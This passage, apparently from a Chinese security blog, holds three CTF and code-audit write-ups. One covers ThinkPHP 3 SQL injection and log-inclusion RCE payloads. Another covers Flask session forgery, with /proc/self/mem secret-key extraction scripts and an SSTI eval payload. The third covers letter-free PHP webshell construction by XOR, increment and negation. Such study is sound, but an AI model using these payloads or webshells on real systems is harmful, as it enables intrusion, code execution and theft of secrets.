';\n&#125;\n显而易见，过滤的很少，报错注入的updatexml和extractvalue，以及联合查询的union也未被过滤，所以这里也可以使用其他语句，例如\nhttp://127.0.0.1:8080/index.php/home/index/select?id[where]=1 and 1=extractvalue(1,concat(0x7e,user(),0x7e))-- -\n亦可使用联合查询\nhttp://127.0.0.1:8080/index.php/home/index/select?id[where]=0 union select user(),2,3\n\n接下来调整断点，将断点放在find处，进行单步调试跟进可以看到这里是判断数值是否为数字字符串串或字符串，满足的话就走if条件下的函数，不过看明显可以看出我们这里是数组（看旁边的options的值为array(1)也可以发现），不满足条件，所以直接走下面。走到这个\n$pk = $this->getPk();\n跟进在上面发现$pk=id接下来继续往下走这里检验了$pk是否为数组，因不满足条件(此处$pk=&#39;id&#39;)，所以直接走下面接下来是添加limit=1，然后这个用了_parseOptions函数进行处理，跟进此自定义函数这里的话可以看到有一个过滤的，但我们这里的话简单看一下就会发现，这里条件并不满足，我们这里的where的值是\n0 union select user(),2,3\n所以这里的话就直接pass，接下来继续走这些就是一些查询语句，然后将结果返回，接下来到最后这里进入parseWhere方法\n我们这里的$where是字符串，所以走if语句，将$where的值赋给$whereStr可以看到这里是直接返回了$whereStr，没有用过滤函数什么的处理，因此最终返回的仍是我们传入的具体SQL内容如下\nSELECT * FROM `users` WHERE 0 union select user(),2,3 LIMIT 1\nexp注入测试这个的话需要简单修改一下我们的select()方法，修改后内容如下\npublic function select() &#123;\n        $map =array('id'=>$_GET['id']);\n        $user = M('users');\n        $data = $user->where($map)->find();\n        var_dump($data);\n        &#125;\n这里需要说明一下，之所以不用I方法，是因为I方法中存在过滤，即think_filter函数，其内容如下\nif(preg_match('/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i',$value))&#123;\n    $value .= ' ';\n&#125;\n可以看出这里过滤了exp，所以不能直接用I方法来写，接下来我们访问网页，写入如下payload\nhttp://127.0.0.1:8080/index.php/home/index/select?id[0]=exp&amp;id[1]==1 and updatexml(1,concat(0x7e,user(),0x7e),1)\n同时开启调试,单步跟进这里的话我们的where是数组，所以条件不满足，直接pass，第二个if同理，然后第三个的话，我们这里并未对optinos[where]进行赋值，所以就会走else，把$where的值赋给他，接着看到find方法这里，第一个if语句，我们这里$options为数组，所以直接pass，第二个if语句，我们的$pk值为id，而非数组，所以也pass，到下面跟之前一样，参数被函数_parseOptions包裹，接下来跟进这个函数这里有一个字段类型验证的，我们可以看到这个是满足条件的，所以他会进入下面这个函数，我们首先这个语句\nif(is_scalar($val)) &#123;\n这里的is_scalar是检验变量是否为标量，什么是标量，官方文档如下我们这里的$val变量值如下是Array，因此不会进入这个if语句，即不会进入_parseType方法，这里直接pass，接着看下面第一个是执行查询语句返回结果的，第二个是返回预编译的语句，继续跟进我们这里用了where，跟进parseWhere方法可以看到这里是拼接,继续往下看最终返回的是拼接的结果，接下来走到最后，得到SQL语句如下\nSELECT * FROM `users` WHERE `id` =1 and updatexml(1,concat(0x7e,user(),0x7e),1) LIMIT 1\nbind注入更改内容如下\npublic function select() &#123;\n   $User = M(\"users\");\n   $user['id'] = I('id');\n   $data['passwd'] = I('passwd');\n   $valu = $User->where($user)->save($data);\n   var_dump($valu);\n       &#125;\npayload如下\nhttp://127.0.0.1:8080/index.php/home/index/select?id[0]=bind&amp;id[1]=0 and updatexml(1,concat(0x7e,user(),0x7e),1)&amp;passwd=1\n接下来开启xdebug,然后访问这里与之前相同，因为是数组，所以让前三个if语句，直接到\nif(isset($this->options['where']))\n这里，因为没有设置这个options[&#39;where&#39;]，所以走下面，将$where的值赋给他，然后将值返回，接下来继续看我们这里的data是一个数组，是有值的，所以\nif(empty($data))\n这个不满足条件，直接看下面，可以看到这里有_facade对data进行了处理，跟进这个函数可以看到这里先是检验了是否有fields是否为空，然后进入\nif(!empty($this->options['field'])) &#123;\n因为这里并不存在options[&#39;field&#39;]，所以直接pass，走else那里，即将fields值赋给这里的fields，接下来是foreach语句因为$data中的passwd在fields中，所以走下面，即elseif那里这里的$var为1是标量，所以满足条件，接下来data被_parseType函数处理，跟进这个函数可以发现这里就是对内容进行了intval处理，没什么影响，继续跟进这里的话是使用了filter函数对内容进行了一次过滤，跟进接下来到_parseOptions函数接下来这里以为$val是数组，使用不会进入_parseType方法，出来该方法后，到这里跟进update方法发现有parseSet方法，跟进此方法可以看到这里拼接了=:，此时的SQL语句为\nUPDATE `users` SET `passwd`=:0\n接下来进入parseWhereItem方法这里可以看出当$exp=bind时，$whereStr是可控的，而后得到拼接后的语句，此时的SQL\n\"UPDATE `users` SET `passwd`=:0 WHERE `id` = :0 and updatexml(1,concat(0x7e,user(),0x7e),1)\"\n接下来到execute执行函数这里重点在于这里\nif(!empty($this->bind))&#123;\n            $that   =   $this;\n            $this->queryStr =   ($this->queryStr,array_map(function($val) use($that)&#123; return '\\''.$that->escapeString($val).'\\''; &#125;,$this->bind));\n        &#125;\n这个strtr函数在这里的话就是起到替换作用，比如我们这里，我们传入的是0(payload中的id[1]=0)，那么这里就会拼接变成:0，而这个strtr函数将其替换为1此时也就得到了我们最终的SQL语句\n\"UPDATE `users` SET `passwd`='1' WHERE `id` = '1' and updatexml(1,concat(0x7e,user(),0x7e),1)\"\n命令执行环境搭建环境配置，我们首先需要在\\Application\\Home\\Controller\\新建一个文件，用之前SQL注入的亦可，这里就用之前的了，修改文件内容如下\n&lt;?php\nnamespace Home\\Controller;\nuse Think\\Controller;\nclass IndexController extends Controller &#123;\n    public function  index($value='')&#123;\n        $this->assign($value);\n        $this->display();\n    &#125;\n&#125;\n因为该漏洞利用的assign函数需要模板渲染，所以需要新建一个模板文件，模板文件位置如下\nThinkPHP\\Application\\Home\\View\\Index\\index.html #内容随意\n这里还需要说明的是，日志和debug的关系\n\n\n\n\n\n\n\n\n\n若开启debug模式日志会到：\\Application\\Runtime\\Logs\\Home\\下若未开启debug模式日志会到：\\Application\\Runtime\\Logs\\Common\\下\n接下来开始复现一下，首先我们创建log文件\n/ThinkPHP/index.php?m=-->&lt;?=phpinfo();?>\n接下来去包含log文件(这里log的文件名与年月日相关)\nhttp://127.0.0.1:8080/ThinkPHP/index.php?m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=./Application/Runtime/Logs/Common/23_01_18.log\n\n漏洞分析这里之所以存在漏洞，其原因是\n\n\n\n\n\n\n\n\n\n由于在业务代码中如果对模板赋值方法assign的第一个参数可控，则导致模板路径变量被覆盖为携带攻击代码路径，造成文件包含，代码执行等危害。\n接下来我们在函数处打上断点而后访问\nhttp://127.0.0.1:8080/ThinkPHP/index.php?m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=./Application/Runtime/Logs/Common/23_01_18.log\n开始单步调试首先来到这个assign函数，这里的name是数组，其内容为我们的日志文件，可以看到这个函数里用了另一个assign函数来处理变量，跟进这里判断$name是否为数组，我们的$name为数组，所以进入if语句，这里的array_merge是合并数组的，但这里$this-&gt;tvar为空，所以这里的话其实就是$this-&gt;tVar=$name，即将name变量的值赋给了$tVar继续跟进接下来到display函数同上个相似，这里是用了另一个同名函数来处理变量，跟进我们这里模板内容为空，看到这里有fetch函数，跟进首先判断了模板文件是否存在而后检验使用的是否是PHP原生模板，系统配置的默认引擎是Think，所以这里走else这里可以看到将$this-&gt;tVar的值赋给了$params，而后进入了listen函数，跟进此函数\n发现这里经过一些判断后进入了exec函数，跟进此函数可以发现这里是调用Behavior\\ParseTemplateBehavior类中的run方法处理$params，我们跟进run方法，寻找哪里对日志文件路径进行了处理，最终找到ThinkPHP\\Library\\Think\\Template.class.php文件下的fetch方法loadTemplate函数是读取文件路径的，而后这里用load函数对其进行了处理，我们跟进此函数$_filename是之前获取到的的缓存文件路径，$vars是带有变量_filename的数组，这里的$vars不为空，因此使用extract方法的EXTR_OVERWRITE默认描述对变量值进行覆盖最后include日志文件路径，造成文件包含，最终导致包含文件造成RCE\n参考链接https://www.freebuf.com/articles/web/345544.htmlhttps://www.freebuf.com/vuls/282906.htmlhttps://mp.weixin.qq.com/s/OqfruwHf9CAt–2dQQfNJwhttps://forum.butian.net/share/546\n","slug":"简记一次Tp3框架审计之旅","date":"2023-01-17T19:42:20.000Z","categories_index":"代码审计","tags_index":"代码审计","author_index":"quan9i"},{"id":"ac14ba8545a9348cf23ed9e993a44b8f","title":"浅析Flask Session伪造","content":"前言Flask的Session伪造之前并未有太多了解，在跨年夜的CatCTF中遇到了catcat这道题，因此对此类题目进行一个简单总结，lx56大师傅已经对Flask有很详细的介绍了，因此这里是站在巨人的肩膀上看世界了属于是，膜拜大佬。\nFlask什么是Flask呢，他其实是一个基于Jinja2模板搭建而成的应用框架，具体如下所示\n\n\n\n\n\n\n\n\n\nFlask是一个Web应用程序框架，使用Python编写。该软件由ArminRonacher开发，他领导着Pocco国际Python爱好者小组。该软件基于WerkzeugWSGI工具箱和Jinja2模板引擎.\nSessionFlask中的Session，它是存在于客户端的，也就是说我们在进行登录过后可以看到自己的Session值，而当我们对这个Session值进行base64解码后，就可以读取它的具体内容。对应Flask，它在生成session时会使用app.config[&#39;SECRET_KEY&#39;]中的值作为salt对session进行一个简单处理，那么这里的话，只要key不泄露，我们就只能得到具体内容，但是无法修改具体内容，因此这个时候就引发了一个问题，当key泄露的时候，就出现了内容伪造的情况，比如具体内容为&#123;&#39;name&#39;:&#39;123&#39;&#125;，而当我们掌握key时，可修改内容为&#123;&#39;name&#39;:&#39;admin&#39;&#125;，从而达到一个越权的效果，因此我们接下来就要说说CTF中怎么获取Key\nKey的获取有两种情况第一种情况，当源码泄露时，Key也可能会泄露，它的泄露位置是config.py，在[HCTF2018]admin中有所体现。第二种情况，就是当存在任意文件读取漏洞时，我们可以通过读取/proc/self/maps来获取堆栈分布，而后读取/proc/self/mem，通过真正则匹配筛选出我们需要的key，这个在[2022蓝帽杯]file_session中有所体现。这里就以他为例来说一下这个Key的获取，其源码如下\n\nimport base64\nimport os\nimport uuid\n\nfrom flask import Flask, request, session, render_template\n\nfrom pickle import _loads\n\nSECRET_KEY = str(uuid.uuid4())\n\napp = Flask(__name__)\napp.config.update(dict(\n    SECRET_KEY=SECRET_KEY,\n))\n\n\n# apt install python3.8\n\n@app.route('/', methods=['GET'])\ndef index():\n    return \"/download?file=?\"\n\n\n@app.route('/download', methods=[\"GET\", 'POST'])\ndef download():\n    print(SECRET_KEY)\n    filename = request.args.get('file', \"static/image/1.jpg\")\n    offset = request.args.get('offset', \"0\")\n    length = request.args.get('length', \"0\")\n    if offset == \"0\" and length == \"0\":\n        return open(filename, \"rb\").read()\n    else:\n        offset, length = int(offset), int(length)\n        f = open(filename, \"rb\")\n        f.seek(offset)\n        ret_data = f.read(length)\n        return ret_data\n\n\n@app.route('/filelist', methods=[\"GET\"])\ndef filelist():\n    return f\"&#123;str(os.listdir('./static/image/'))&#125; /download?file=static/image/1.jpg\"\n\n\n@app.route('/admin_pickle_load', methods=[\"GET\"])\ndef admin_pickle_load():\n    if session.get('data'):\n        data = _loads(base64.b64decode(session['data']))\n        return data\n    session[\"data\"] = base64.b64encode(b\"error\")\n    return 'admin pickle'\n\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', debug=False, port=8888)\n\n可以看到它的这个key是随机生成的uuid，在download路由中存在key，我们这里注意到他有三个参数，分别是file、offset以及length，接下来按我们刚刚所说，第一步通过/proc/self/maps读取堆栈分布，然后在读取/proc/self/mem的内存数据。这里的话需要说明一下，内存中存在一个动态库/usr/local/lib/faketime/libfaketime.so.1，这个动态链接库是可以劫持程序获取时间时的返回值。因此我们这里可以使用这个来进行一个简单筛选，读取出堆栈分布，接下来进行读取内存，此时用一个uuid格式的正则匹配，就可以得到key（由于没有找到复现环境，这里使用的截图参考自其他师傅的Wp）\nimport requests, re\n\nurl = \"http://192.168.244.133:7410/\"\nmaps_url = f\"&#123;url&#125;/download?file=/proc/self/maps\"\nmaps_reg = \"([a-z0-9]&#123;12&#125;-[a-z0-9]&#123;12&#125;) rw.*?00000000 00:00 0\"\nmaps = re.findall(maps_reg, requests.get(maps_url).text)\n# print(maps)\nfor m in maps:\n    start, end = m.split(\"-\")[0], m.split(\"-\")[1]\n    Offset, Length = str(int(start, 16)), str(int(end, 16) - int(start, 16))\n    read_url = f\"&#123;url&#125;/download?file=/proc/self/mem&amp;offset=&#123;Offset&#125;&amp;length=&#123;Length&#125;\"\n    s = requests.get(read_url).content\n    rt = re.findall(b\"[a-z0-9]&#123;8&#125;-[a-z0-9]&#123;4&#125;-[a-z0-9]&#123;4&#125;-[a-z0-9]&#123;4&#125;-[a-z0-9]&#123;12&#125;\", s)\n    if rt:\n        print(rt)\n此时就可以进行Session伪造了\n题目CTFshow内部赛[蓝瘦]题目环境https://ctf.show/challenges打开题目是一个环境框看源代码是否有注释两个注释\n\n\n\n\n\n\n\n\n\nparam：参数，这里的话就可能是提示有名为ctfshow的参数key：这里的话联想到FLask的Secret_key\n随便输入一下，成功进入界面回显admin，看一下cookie\nCookie: session=eyJ1c2VybmFtZSI6IjEifQ.Y7bSGw.KsS3ZA9BBEYGaflk2Sm5wS3dthw\n用flask_session_cookie_manager3.py进行解密\npython flask_session_cookie_manager3.py decode -s \"ican\" -c \"eyJ1c2VybmFtZSI6IjEifQ.Y7bNzg.k_DFbUcMkBDAZwZuKR2gvFuiQhc\"\n得到数据为&#123;&#39;username&#39;:&#39;1&#39;&#125;，猜测这里应该是想让我们修改为admin，因此修改1为admin，而后进行加密\npython flask_session_cookie_manager3.py encode -t \"&#123;'username':'admin'&#125;\" -s \"ican\"\n将得到的Session去替换网站上的提示缺少参数，这里想到之前的ctfshow，拿上去看看有回显，想到这里可能是SSTI，检验一下用语句直接打\n&#123;&#123;config.__init__.__globals__['__builtins__']['eval'](\"__import__('os').popen('env').read()\")&#125;&#125;\n//ls后没找到flag，猜测藏环境变量里了，因此直接看env即可\n\n[HCTF2018]admin题目环境[HCTF2018]admin进入环境后发现有两个功能点，注册和登录联想到SQL的二次注入，但尝试过后发现并非如此，此时无意间查看到修改界面处的源代码中存在注释应该是源代码,查看配置文件后发现key泄露，这里应该是考察Flask的session伪造，因此我们接下来对Cookie中的Session进行解密\npython flask_session_cookie_manager3.py decode -s \"ckj123\" -c \"Session值\"\n修改name为admin，再进行加密\npython flask_session_cookie_manager3.py encode -t \"修改name为admin后的json字符串\" -s \"ckj123\"\n替换一下成功获取Flag\nCatCTF[cat cat]题目环境https://ctfm.lxscloud.top/category/test/challenge/13发现有file，尝试目录穿越，读取文件源码代码有点乱，这里可以⽤ bytes 的 decode()⽅法获取格式化的源码整体源码如下\nimport os\nimport uuid\nfrom flask import Flask, request, session, render_template, Markup\nfrom cat import cat\n\nflag = \"\"\napp = Flask(\n    __name__,\n    static_url_path='/',\n    static_folder='static'\n)\napp.config['SECRET_KEY'] = str(uuid.uuid4()).replace(\"-\", \"\") + \"*abcdefgh\"\nif os.path.isfile(\"/flag\"):\n    flag = cat(\"/flag\")\n    os.remove(\"/flag\")\n\n\n@app.route('/', methods=['GET'])\ndef index():\n    detailtxt = os.listdir('./details/')\n    cats_list = []\n    for i in detailtxt:\n        cats_list.append(i[:i.index('.')])\n\n    return render_template(\"index.html\", cats_list=cats_list, cat=cat)\n\n\n@app.route('/info', methods=[\"GET\", 'POST'])\ndef info():\n    filename = \"./details/\" + request.args.get('file', \"\")\n    start = request.args.get('start', \"0\")\n    end = request.args.get('end', \"0\")\n    name = request.args.get('file', \"\")[:request.args.get('file', \"\").index('.')]\n\n    return render_template(\"detail.html\", catname=name, info=cat(filename, start, end))\n\n\n@app.route('/admin', methods=[\"GET\"])\ndef admin_can_list_root():\n    if session.get('admin') == 1:\n        return flag\n    else:\n        session['admin'] = 0\n    return \"NoNoNo\"\n\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', debug=False, port=5637)\n\n首先映入眼帘的是flag部分\nif os.path.isfile(\"/flag\"):\n    flag = cat(\"/flag\")\n    os.remove(\"/flag\")\n这里的话可以看出是读取并删除flag文件，然后我们看哪里可以获取flag，看到admin路由\n@app.route('/admin', methods=[\"GET\"])\ndef admin_can_list_root():\n    if session.get('admin') == 1:\n        return flag\n    else:\n        session['admin'] = 0\n    return \"NoNoNo\"\n当admin=1时会返回flag，这个应该是需要伪造admin了，这里从源码中可以看出是Flask框架，所以这里的话应该就是Session伪造了，想要伪造Session，Key是必不可少的，我们这里注意到Key部分的代码\napp.config['SECRET_KEY'] = str(uuid.uuid4()).replace(\"-\", \"\") + \"*abcdefgh\"\n可以看到Key是随机生成uuid后去除-而后再拼接*abcdefgh组成的。 获取key的话，这里联想到Python存储对象的位置在堆上，我们这里的app是实例化的Flask对象，key的位置是app.config[&#39;SECRET_KEY&#39;]，所以我们理论上可以通过读取/proc/self/mem来读取key，但由于/proc/self/mem内容较多，同时存在不可读取的内容，直接读取它的话会导致程序崩溃，所以这里我们采用的方法是先读取/proc/self/maps获取堆栈分布，而后再在其中读取/proc/self/mem，读取对应位置的内容，接下来利用正则匹配筛选即可获取key，这个与蓝帽杯file_session中的获取key部分有异曲同工之妙，具体可以看这篇文章https://mp.weixin.qq.com/s/A9OmgHAmGLJPEL4cQBU8zQ然后读取文件部分的话，是info路由\n@app.route('/info', methods=[\"GET\", 'POST'])\ndef info():\n    filename = \"./details/\" + request.args.get('file', \"\")\n    start = request.args.get('start', \"0\")\n    end = request.args.get('end', \"0\")\n    name = request.args.get('file', \"\")[:request.args.get('file', \"\").index('.')]\n\n    return render_template(\"detail.html\", catname=name, info=cat(filename, start, end))\n获取到三个可控参数，start和end以及file，我们这里可以参考蓝帽杯的Wp，简单修改一下参数和筛选规则，就可以得到key，构造脚本如下\nimport requests, re\n\nurl = \"http://f014a421-a286-4ff6-a275-4fa0488315d6.ctfm.lxscloud.top/\"\nmaps_url = f\"&#123;url&#125;/info?file=../../proc/self/maps\"\nmaps_reg = \"([a-z0-9]&#123;12&#125;-[a-z0-9]&#123;12&#125;) rw.*?00000000 00:00 0\"\nmaps = re.findall(maps_reg, requests.get(maps_url).text)\n#print(maps)\nfor m in maps:\n    start, end = m.split(\"-\")[0], m.split(\"-\")[1]\n    start, end = str(int(start, 16)), str(int(end, 16))\n    read_url = f\"&#123;url&#125;/info?file=../../proc/self/mem&amp;start=&#123;start&#125;&amp;end=&#123;end&#125;\"\n    s = requests.get(read_url).content\n    rt = re.findall(b\"[a-z0-9]&#123;32&#125;\\*abcdefgh\", s)\n    if rt:\n        print(rt)\n运行结果如下图成功获取key，接下来利用flask-session-cookie-manager来伪造session访问admin路由，获取session接下来我们进行解码\npython flask_session_cookie_manager3.py decode -s \"密钥\" -c \"Session值\"\n\n可以看到这里结果为&#123;&#39;admin&#39;:0&#125;，我们修改为&#123;&#39;admin&#39;:1&#125;，再对其进行加密\npython flask_session_cookie_manager3.py encode -s \"28d470b5a8164df4b6c77ce187e52e6d*abcdefgh\" -t \"&#123;'admin': 1&#125;\"\n接下来将伪造的Session值拿去替换掉网站的Session，再刷新界面成功获取到Flag\n参考文章https://lxscloud.top/2022/10/09/Python_Flaskhttps://www.leavesongs.com/PENETRATION/client-session-security.html\n","slug":"Flask Session伪造","date":"2023-01-05T14:55:20.000Z","categories_index":"WEB知识","tags_index":"FLask","author_index":"quan9i"},{"id":"882cd13ace786346d67ca526dbf954fe","title":"从CTFShow[RCE挑战]中学习自增构造webshell","content":"前言在CTFShow的每周挑战中遇到了PHP无数字字母构造的一系列题目，做了做发现我这个菜鸡不怎么会，所以对此类题进行一个简单总结，希望能对正在学习的师傅有所帮助。\n构造语句的几种方式首先来看一下最原始的例题\n&lt;?php\nhighlight_file(__FILE__);\n$code = $_GET['code'];\nif(preg_match(\"/[A-Za-z0-9]+/\",$code))&#123;\n    die(\"hacker!\");\n&#125;\n@eval($code);\n?>\n此时的话只是ban了数字和字母，然后这个时候的话想要构造webshell就需要用其他字符了，然后我们这里的话可以用位运算符中的取反、自增来做这个。\n异或这里需要先讲一点基础知识。什么是异或，我们这里举一个例子，我们将字符A和?进行异或操作\n&lt;?php\necho 'A'^'?';\n可以发现得到的结果是~，那么它是如何计算的呢，过程如下首先将A和?分别转换为对应的ASCII码，A变为65，?变为63然后将其转换为对应的二进制数，A变为1000001，1变为111111接下来就进行运算，异或的运算规则是相同为0，不同为1\nA:\t\t1000001\n1:\t\t0111111(少一位，前面补0即可) \n结果：\t1111110\n接下来将其二进制转换为对应十进制数，1111110对应的十进制数为126，根据ASCII码表可知126对应的是~，所以这个时候得到的字符就是~。因此，我们利用这种思路，可以借助异或构造payload如下\n$__=(\"#\"^\"|\"); // _\n$__.=(\".\"^\"~\"); // _P\n$__.=(\"/\"^\"`\"); // _PO\n$__.=(\"|\"^\"/\"); // _POS\n$__.=(\"&#123;\"^\"/\"); // _POST \n$$__[_]($$__[__]); // $_POST[_]($_POST[__]);\n然后我们再取消一下换行符，将它合并于一行之中\n$__=(\"#\"^\"|\");$__.=(\".\"^\"~\");$__.=(\"/\"^\"`\");$__.=(\"|\"^\"/\");$__.=(\"&#123;\"^\"/\");$$__[_]($$__[__]);\n最后进行一次URL编码（因为中间件会进行一次解码，所以我们这里需要手动编码一次），即可得最终payload\n%24__%3D(%22%23%22%5E%22%7C%22)%3B%24__.%3D(%22.%22%5E%22~%22)%3B%24__.%3D(%22%2F%22%5E%22%60%22)%3B%24__.%3D(%22%7C%22%5E%22%2F%22)%3B%24__.%3D(%22%7B%22%5E%22%2F%22)%3B%24%24__%5B_%5D(%24%24__%5B__%5D)%3B\n接下来本地简单测试一下，测试代码为\n&lt;?php\nhighlight_file(__FILE__);\n$code = $_POST['code'];\nif(preg_match(\"/[a-zA-Z0-9]/\",$code))&#123;\n    die(\"hacker!\");\n&#125;\neval($code);\n?>\n但是这种方式如果自己去慢慢找的话，过程是极为缓慢的，想到我们异或一次不仅能构造出一个字符，也可以一次构造出多个字符，比如(&#39;AB&#39;)^(&#39;11&#39;)此时就可以得到qs字符串，那我们这里是不是就可以构造一个脚本，通过一次异或运算得到我们想构造的字符串，比如system，那这里的话我们大体思路的话就有了\n第一步：寻找未被过滤的字符\n第二步：写入我们想构造的字符串，然后对它进行一个遍历，先获取第一个字符\n第三步：用刚刚找到的未被过滤的字符进行一个遍历，看哪两个能够通过异或运算构造出第一个字符，同理得到后面的\n第四步：输出时将字符进行一个URL编码，因为涉及到了部分不可见字符\n这里想到之前在CTFShow命令执行系列中用过一个脚本与此类似，这里简单修改一下脚本，就可以达到我们想要的效果了，脚本如下\nimport re\nimport requests\nimport urllib\nfrom sys import *\nimport os\n\na=[]\nans1=\"\" \nans2=\"\"\nfor i in range(0,256): #设置i的范围\n    c=chr(i)\n    #将i转换成ascii对应的字符，并赋值给c\n    tmp = re.match(r'[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\&#123;|\\&#125;|\\&amp;|\\-',c,re.I)\n    #设置过滤条件，让变量c在其中找对应，并利用修饰符过滤大小写，这样可以得到未被过滤的字符\n    if(tmp):\n        continue\n        #当执行正确时，那说明这些是被过滤掉的，所以才会被匹配到，此时我们让他继续执行即可\n    else:\n        a.append(i)\n        #在数组中增加i，这些就是未被系统过滤掉的字符\n\n# eval(\"echo($c);\");\nmya=\"system\"  #函数名 这里修改！\nmyb=\"dir\"      #参数\ndef myfun(k,my): #自定义函数\n    global ans1 #引用全局变量ans1，使得在局部对其进行更改时不会报错\n    global ans2 #引用全局变量ans2，使得在局部对其进行更改时不会报错\n    for i in range (0,len(a)): #设置循环范围为（0，a）注：a为未被过滤的字符数量 \n        for j in range(i,len(a)): #在上个循环的条件下设置j的范围\n            if(a[i]^a[j]==ord(my[k])):\n                ans1+=chr(a[i]) #ans1=ans1+chr(a[i])\n                ans2+=chr(a[j]) #ans2=ans2+chr(a[j])\n                return;#返回循环语句中，重新寻找第二个k，这里的话就是寻找y对应的两个字符\nfor x in range(0,len(mya)): #设置k的范围\n    myfun(x,mya)#引用自定义的函数\ndata1=\"('\"+urllib.request.quote(ans1)+\"'^'\"+urllib.request.quote(ans2)+\"')\" #data1等于传入的命令,\"+ans1+\"是固定格式，这样可以得到变量对应的值，再用'包裹，这样是变量的固定格式，另一个也是如此，两个在进行URL编码后进行按位与运算，然后得到对应值\nprint(data1)\nans1=\"\"#对ans1进行重新赋值\nans2=\"\"#对ans2进行重新赋值\nfor k in range(0,len(myb)):#设置k的范围为(0,len(myb))\n    myfun(k,myb)#再次引用自定义函数\ndata2=\"(\\\"\"+urllib.request.quote(ans1)+\"\\\"^\\\"\"+urllib.request.quote(ans2)+\"\\\")\"\nprint(data2)\n接下来去尝试一下\n自增https://www.php.net/manual/zh/language.operators.increment.php当我们通过某种方法可以得到一个字符时，我们就可以通过自增来获取其他字符，比如现在我们获取到了$_=A，我们进行$_++，此时$_就变成了B，同理就可以构造出GET以及POST字符，接下来以例子来进行讲解,这里例题的话还用之前的demo\n&lt;?php\nhighlight_file(__FILE__);\n$code = $_POST['code'];\nif(preg_match(\"/[A-Za-z0-9]+/\",$code))&#123;\n    die(\"hacker!\");\n&#125;\n@eval($code);\n?>\n我们首先可以写一个[]看一下\n&lt;?php\n$_=[];\nvar_dump($_);\n这个时候的话可以看到它就是一个数组，我们无法获取它的这个Array字符，那我们该怎么获取呢，我们尝试拼接一个数字\n&lt;?php\n$_=[].'1';\nvar_dump($_);\n这里看到输出的是Array1，我们这里是不允许出现数字的，但我们直接拼接个空是不是也是可行的呢，尝试一下\n&lt;?php\n$_=[].'';\nvar_dump($_);\n成功获取到了字符Array，然后我们获取想获取A的话，就可以采用$_[0]这种方式来获取，但我们是不能够写数字的，所以我们这里可以用一个判断,比如我们在[]里加一个==$，此时因为空和$不同，它就会输出0，此时也就等同于$_[0]，具体实现代码如下\n&lt;?php\n$_=[];\n$_=$_[''=='$'];\necho $_;\n此时成功获取到了字符A，有了A，我们就可以通过自增依次获取其他字符，我们尝试获取一个字符G\n&lt;?php\n$_=[];//Array\n$_=$_[''=='$'];//A\n$_++;//B\n$_++;//C\n$_++;//D\n$_++;//E\n$_++;//F\n$_++;//G\nvar_dump($_);\n然后看我们这里的代码的话，是eval($code)，所以我们就可以构造这种的$_GET[1]($_GET[0])，这个时候我们就可以system(ls)这种命令的执行，所以接下来的话就开始构造\n&lt;?php\n$_=[].'';//Array\n$_=$_[''=='$'];//A\n$_++;//B\n$_++;//C\n$_++;//D\n$_++;//E\n$__=$_;//E\n$_++;//F\n$_++;//G\n$___=$_;//G\n$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;//T\n$_=$___.$__.$_;//GET\n//var_dump($_);\n$_='_'.$_;//_GET\nvar_dump($$_[_]($$_[__]));\n//$_GET[_]($_GET[__])\n接下来就可以尝试去给_和__GET传参，这里我们需要把换行的都去掉，然后进行一次URL编码，因为中间件会解码一次，所以我们构造的payload先变成这样\n$_=[].'';$_=$_[''=='$'];$_++;$_++;$_++;$_++;$__=$_;$_++;$_++;$___=$_;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_=$___.$__.$_;$_='_'.$_;$$_[_]($$_[__]);\n而后变成\n%24_%3D%5B%5D.''%3B%24_%3D%24_%5B''%3D%3D'%24'%5D%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24__%3D%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24___%3D%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%3D%24___.%24__.%24_%3B%24_%3D'_'.%24_%3B%24%24_%5B_%5D(%24%24_%5B__%5D)%3B\n此时去尝试赋值成功执行了命令，输出了当前目录\n取反这个的话我们这里其实是利用了不可见字符，我们对一个字符进行两次取反，得到的还是其本身。当我们进行一次取反过后，对其进行URL编码，再对其进行取反，此时可以得到可见的字符，它的本质其实还是这个字符本身，然后因为取反用的多是不可见字符，所以这里就达到了一种绕过的目的。\n这里的话利用一个php脚本即可获取我们想要的字符\n&lt;?php\n$ans1='system';//函数名\n$ans2='dir';//命令\n$data1=('~'.urlencode(~$ans1));//通过两次取反运算得到system\n$data2=('~'.urlencode(~$ans2));//通过两次取反运算得到dir\necho ('('.$data1.')'.'('.$data2.')'.';');\n接下来为例尝试一下\n&lt;?php\nhighlight_file(__FILE__);\n$code = $_GET['code'];\nif(preg_match(\"/[a-zA-Z0-9]/\",$code))&#123;\n    die(\"hacker!\");\n&#125;\neval($code);\n?>\n\n关于自增的一些知识点知识点1在自增中，可以通过特殊字符构造出字符串的有以下几种方式\n[].''  //Array\n(0/0).''   //NAN\n(1/0).''   //INF\n这个时候就有一个问题了，如果ban了数字，我们该怎么去构造NAN和INF呢，这个时候就需要讲到一个知识点，我们这里的话需要说一下这个NAN和INF\nNaN（Not a Number，非数）是计算机科学中数值数据类型的一类值，表示未定义或不可表示的值。常在浮点数运算中使用。首次引入NaN的是1985年的IEEE 754浮点数标准。\n\nINF：infinite，表示“无穷大”。 